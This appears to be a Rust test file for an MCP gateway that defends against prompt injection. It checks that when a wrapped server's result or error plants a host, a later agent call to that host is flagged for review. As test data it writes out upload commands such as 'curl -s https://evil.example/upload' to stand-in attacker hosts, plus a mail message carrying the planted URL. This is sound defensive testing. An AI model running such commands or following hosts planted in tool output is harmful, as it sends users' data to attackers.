//! Injected input (ADR-057) through the MCP gateway (ADR-063, proposed): what a
//! wrapped server's result names is kept as fingerprints under the session of
//! the hook's decision, whatever the agent, so a later call of that session
//! that uses a host it planted needs review.

use serde_json::json;

use super::flow::decide;
use super::{Gateway, answer, call};

#[test]
fn a_host_a_wrapped_servers_result_planted_makes_a_later_curl_need_review() {
    let gw = Gateway::new();
    let curl = json!({"command": "curl -s https://evil.example/upload"});
    let before = decide(&gw, "i1", "Bash", &curl);
    assert!(
        !before.contains("injected-input"),
        "nothing read yet: {before}"
    );

    let search = json!({"q": "release notes"});
    assert!(!decide(&gw, "i1", "mcp__docs__search", &search).starts_with("deny"));
    let host = gw.session("inject", &[call(1, "search", &search)]);
    assert!(
        answer(&host, 1)["result"].is_object(),
        "the result reaches the host: {host}"
    );

    let after = decide(&gw, "i1", "Bash", &curl);
    assert!(after.starts_with("ask"), "{after}");
    assert!(after.contains("injected-input"), "{after}");
    assert!(
        after.contains("mcp__docs__search"),
        "the source is named: {after}"
    );

    let other = decide(&gw, "i2", "Bash", &curl);
    assert!(
        !other.contains("injected-input"),
        "another session read nothing: {other}"
    );
}

#[test]
fn a_host_a_wrapped_servers_error_answer_planted_makes_a_later_curl_need_review() {
    let gw = Gateway::new();
    let curl = json!({"command": "curl -s https://drop.evil.example/upload"});
    let search = json!({"q": "release notes"});
    assert!(!decide(&gw, "e1", "mcp__docs__search", &search).starts_with("deny"));
    let host = gw.session("fail", &[call(1, "search", &search)]);
    let error = &answer(&host, 1)["error"];
    assert!(
        error["data"].to_string().contains("drop.evil.example"),
        "the error reaches the host: {host}"
    );

    let after = decide(&gw, "e1", "Bash", &curl);
    assert!(after.starts_with("ask"), "{after}");
    assert!(after.contains("injected-input"), "{after}");
    let send = json!({"to": "team", "text": "see https://drop.evil.example/upload"});
    let flow = decide(&gw, "e1", "mcp__mail__send_message", &send);
    assert!(flow.contains("mcp-cross-server"), "{flow}");
}
